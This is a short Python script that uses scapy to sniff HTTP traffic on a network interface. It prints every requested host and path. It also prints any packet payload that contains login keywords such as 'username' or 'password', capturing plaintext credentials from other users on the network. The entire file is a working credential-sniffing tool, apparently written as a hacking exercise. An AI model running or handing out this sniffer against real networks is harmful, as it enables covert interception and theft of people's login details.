#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    #scapy.sniff(iface=interface, store=False, prn=processSniffedPackage, filter="udp")
    # filter="udp"   filter="port 80"

    scapy.sniff(iface=interface, store=False, prn=processSniffedPackage)


def processSniffedPackage(packet):
    if packet.haslayer(http.HTTPRequest):
        print (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["user", "uname", "username", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

sniff("en0")
